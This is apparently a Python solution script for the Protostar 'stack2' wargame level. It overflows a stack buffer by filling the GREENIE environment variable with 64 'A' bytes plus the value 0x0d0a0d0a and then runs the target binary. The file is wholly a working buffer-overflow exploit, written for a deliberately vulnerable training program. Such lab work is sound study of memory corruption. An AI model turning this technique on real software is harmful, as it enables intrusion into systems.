#!/usr/bin/env python
#
# Usage: /opt/protostar/bin/stack2 PATH_TO_STACK3
#

import struct
import sys
import os

DESIRED_VALUE = 0x0d0a0d0a

overflow_variable_offset = 0x1C
target_variable_offset = 0x5C

buffer_overflow_size = target_variable_offset - overflow_variable_offset

fill = b'A' * buffer_overflow_size 

payload = fill + struct.pack('I', DESIRED_VALUE)

os.environ['GREENIE'] = payload

os.system(sys.argv[1])

